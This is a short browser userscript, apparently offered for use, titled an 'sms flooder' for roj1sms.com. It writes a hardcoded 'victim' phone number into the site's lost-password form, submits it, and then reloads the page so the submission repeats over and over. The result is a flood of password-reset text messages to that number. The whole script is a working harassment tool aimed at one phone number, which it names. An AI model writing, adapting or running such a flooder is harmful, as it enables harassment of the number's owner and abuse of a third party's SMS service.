// ==UserScript==
// @name          Anonymous ROJ1SMS.com sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*roj1sms.com/*
// ==/UserScript==

var victim=9953763381//Enter victims number here

if(document.location=="http://www.roj1sms.com/lostpass.php"||document.location=="http://www.roj1sms.com/lostpass.php")
{
document.forms[1].elements[0].value=victim;
document.forms[1].submit();
}
if(document.location=="http://www.roj1sms.com/lostpass.php"||document.location=="http://www.roj1sms.com/lostpass.php")
document.location='http://www.roj1sms.com/lostpass.php';